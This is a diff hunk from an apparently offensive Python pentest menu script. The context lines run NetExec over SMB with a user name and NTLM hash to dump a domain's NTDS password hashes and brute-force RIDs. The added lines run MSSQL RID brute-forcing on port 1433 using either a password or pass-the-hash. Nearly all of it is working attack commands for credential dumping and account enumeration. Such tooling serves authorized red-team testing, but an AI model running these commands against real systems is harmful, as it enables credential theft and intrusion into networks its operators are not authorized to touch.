@@ -4679,7 +4679,15 @@ while True:
                print("\n[+] Enumerating NTDS...\n")
                remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
                print("\n[+] Performing rid brute...\n")
-               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --rid-brute 20000")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --rid-brute 20000")               
+      checkParam = test_PRT("1433")
+      if checkParam != 1:
+         print("\n[+] Performing MSSQL rid brute...\n")
+         if NTM[:5] == "EMPTY":
+            remoteCOM("nxc mssql " + TIP.strip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute --local-auth")
+         else:
+            print("[i] Using HASH value as password credential...")
+            remoteCOM("nxc mssql " + TIP.strip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --rid-brute --local-auth")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
